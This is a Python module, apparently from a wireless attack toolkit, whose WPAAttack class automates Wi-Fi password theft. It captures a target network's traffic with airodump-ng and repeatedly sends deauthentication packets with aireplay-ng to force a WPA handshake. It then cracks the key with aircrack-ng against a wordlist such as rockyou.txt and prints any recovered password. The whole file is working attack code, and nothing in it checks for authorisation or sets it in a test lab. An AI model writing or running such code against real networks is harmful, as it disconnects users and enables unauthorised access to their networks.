import subprocess
import os
import time
import re
from ..core.ui import print_status, print_success, print_error, print_warning
from ..core.config import Config

class WPAAttack:
    def __init__(self, interface, target):
        self.interface = interface
        self.target = target

    def capture_handshake(self):
        print_status(f"Starting Handshake capture for {self.target.essid}...")
        cap_prefix = os.path.join(Config.OUTPUT_DIR, f"{self.target.essid.replace(' ', '_')}_handshake")
        
        dump_proc = subprocess.Popen([
            'airodump-ng', self.interface,
            '--bssid', self.target.bssid,
            '--channel', self.target.channel,
            '--write', cap_prefix
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        try:
            while True:
                print_warning("Sending Deauth packets...")
                subprocess.run([
                    'aireplay-ng', '--deauth', str(Config.DEAUTH_PACKETS),
                    '-a', self.target.bssid,
                    self.interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                time.sleep(5)
                cap_file = cap_prefix + "-01.cap"
                if self.check_handshake(cap_file):
                    print_success("Handshake captured!")
                    dump_proc.terminate()
                    return cap_file
        except KeyboardInterrupt:
            dump_proc.terminate()
            return None

    def check_handshake(self, cap_path):
        if not os.path.exists(cap_path): return False
        result = subprocess.run(['aircrack-ng', cap_path], capture_output=True, text=True)
        return "1 handshake" in result.stdout

    def crack(self, cap_path, wordlist=None):
        if not wordlist:
            # Try custom wordlist first, then fallback
            if os.path.exists(Config.DEFAULT_WORDLIST):
                wordlist = Config.DEFAULT_WORDLIST
            elif os.path.exists(Config.FALLBACK_WORDLIST):
                wordlist = Config.FALLBACK_WORDLIST
            else:
                print_error("No wordlists found (checked test_wordlist.txt and rockyou.txt).")
                return
        
        print_status(f"Starting cracking process using: {wordlist}")
        result = subprocess.run([
            'aircrack-ng', '-w', wordlist,
            '-b', self.target.bssid,
            cap_path
        ], capture_output=True, text=True)
        
        print(result.stdout)
        
        # Parse output for KEY FOUND!
        match = re.search(r"KEY FOUND! \[ (.*) \]", result.stdout)
        if match:
            password = match.group(1)
            print_success(f"Password Found: {password}")
            return password
        else:
            print_error("Password not found in wordlist.")
            return None
